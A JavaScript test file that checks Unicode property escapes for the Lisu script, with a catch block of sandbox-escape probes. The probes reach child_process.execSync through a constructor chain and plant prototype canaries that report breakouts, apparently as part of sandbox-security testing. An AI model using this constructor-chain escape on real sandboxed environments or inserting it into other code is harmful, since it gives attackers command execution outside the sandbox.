try {
    const matchSymbols = buildString({
        loneCodePoints: [73648],
        ranges: [[
                42192,
                42239
            ]]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Lisu}+$/u, matchSymbols, '\\p{Script_Extensions=Lisu}');
    testPropertyEscapes(/^\p{Script_Extensions=Lisu}+$/u, matchSymbols, '\\p{Script_Extensions=Lisu}');
    testPropertyEscapes(/^\p{scx=Lisu}+$/u, matchSymbols, '\\p{scx=Lisu}');
    testPropertyEscapes(/^\p{scx=Lisu}+$/u, matchSymbols, '\\p{scx=Lisu}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                42191
            ],
            [
                42240,
                56319
            ],
            [
                57344,
                73647
            ],
            [
                73649,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Lisu}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Lisu}');
    testPropertyEscapes(/^\P{Script_Extensions=Lisu}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Lisu}');
    testPropertyEscapes(/^\P{scx=Lisu}+$/u, nonMatchSymbols, '\\P{scx=Lisu}');
    testPropertyEscapes(/^\P{scx=Lisu}+$/u, nonMatchSymbols, '\\P{scx=Lisu}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}